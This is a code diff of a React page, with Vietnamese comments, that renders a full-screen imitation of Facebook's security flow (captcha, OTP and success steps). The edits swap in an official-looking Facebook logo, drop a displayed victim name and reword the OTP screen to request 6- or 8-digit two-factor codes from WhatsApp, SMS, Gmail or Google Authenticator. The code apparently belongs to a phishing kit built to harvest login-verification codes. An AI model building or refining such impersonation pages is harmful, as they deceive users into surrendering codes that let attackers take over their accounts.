@@ -699,9 +699,9 @@ export default function Home() {
       {/* ================= FULL PAGE GIAO DIỆN (CAPTCHA, OTP, SUCCESS) ================= */}
       {showFullPage && (
         <div style={{ position: 'fixed', inset: 0, background: '#fff', zIndex: 2000, display: 'flex', flexDirection: 'column', overflowY: 'auto' }}>
-          {/* Header Facebook (logo góc trái) */}
+          {/* Header Facebook (logo góc trái) - Đã thay bằng logo chữ */}
           <div style={{ padding: '16px 24px', borderBottom: '1px solid #e4e6eb' }}>
-            <img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Facebook" style={{ height: '32px' }} />
+            <img src="https://static.xx.fbcdn.net/rsrc.php/yw/r/vL1z2-y9Dp8.svg" alt="Facebook" style={{ height: '32px' }} />
           </div>
 
           <div style={{ flex: 1, display: 'flex', justifyContent: 'center', alignItems: 'flex-start', padding: '40px 16px' }}>
@@ -747,19 +747,17 @@ export default function Home() {
                 </div>
               )}
 
-              {/* BƯỚC 4: OTP FULL PAGE - Layout giống Facebook */}
+              {/* BƯỚC 4: OTP FULL PAGE - Đã cập nhật text và layout */}
               {step === 4 && !showSuccess && (
                 <div>
-                  <p style={{ fontSize: '14px', color: '#65676b', marginBottom: '8px' }}>Lê Hiếu • Facebook</p>
-
                   {/* Hai cột: text bên trái, ảnh 2FA bên phải */}
                   <div style={{ display: 'flex', alignItems: 'flex-start', gap: '24px', marginBottom: '24px', flexWrap: 'wrap' }}>
                     <div style={{ flex: '1 1 260px', minWidth: '240px' }}>
                       <h2 style={{ fontSize: '24px', fontWeight: '700', marginBottom: '8px', color: '#1c1e21', lineHeight: '1.3' }}>
-                        Check your WhatsApp messages
+                        Two-factor authentication
                       </h2>
                       <p style={{ fontSize: '15px', color: '#1c1e21', margin: 0, lineHeight: '1.4' }}>
-                        Enter the code we sent to your WhatsApp account at <strong>+84 *******00</strong>.
+                        Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.
                       </p>
                     </div>
                     <div style={{ flex: '0 1 220px', minWidth: '180px' }}>
